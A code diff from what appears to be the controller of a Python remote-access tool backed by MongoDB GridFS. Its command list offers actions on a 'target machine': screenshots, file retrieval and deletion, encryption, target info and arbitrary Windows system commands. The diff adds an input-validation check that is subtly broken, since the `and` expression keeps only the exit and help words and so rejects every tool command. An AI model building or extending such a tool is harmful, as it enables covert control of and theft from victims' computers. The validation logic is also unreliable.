@@ -22,7 +22,7 @@ db=client['shell']
 
 fs=gridfs.GridFS(db)
 
-MY_COMMANDS=['dir --> target machine current directory contents','cd --> 1 step forward directory','cd.. --> 1 step backward directory','deletefile','createfile','snap','renamefile','getfile','showimg','mkdir','rmdir','activewindows','getfilesize','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system --> helps to perform any system command for windows']
+MY_COMMANDS=['dir','cd','cd..','deletefile','createfile','snap','renamefile','getfile','showimg','mkdir','rmdir','activewindows','getfilesize','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system']
 
 CWD=r""
 LAST_PATH=""
@@ -258,6 +258,12 @@ def ActionUploader():
     a= (PREV_COMMAND.split(" "))
     col=db['myshell']
     clearCollection()
+
+    if ((a[0] not in (MY_COMMANDS and ['exit','e','quit','q','commands']))):
+        print(Fore.CYAN+">>> ")
+        print("invalid command")
+        return
+    
 
     if a[0]=='commands' and len(a)==1:
         print(Fore.CYAN+">>> ")
